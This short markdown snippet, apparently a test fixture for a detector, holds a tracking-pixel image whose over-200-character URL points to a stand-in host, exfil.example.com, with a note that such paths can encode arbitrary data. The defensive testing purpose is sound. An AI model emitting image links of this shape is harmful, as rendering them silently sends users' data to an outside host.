# Embedded image — long URL

![tracking](https://exfil.example.com/very/long/path/that/encodes/data/segments/in/the/URL/itself/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/pixel.png)

The image URL above is over 200 characters total — long enough to
trip the length threshold regardless of query-string content. Real
payloads of this shape can encode arbitrary data in path segments.
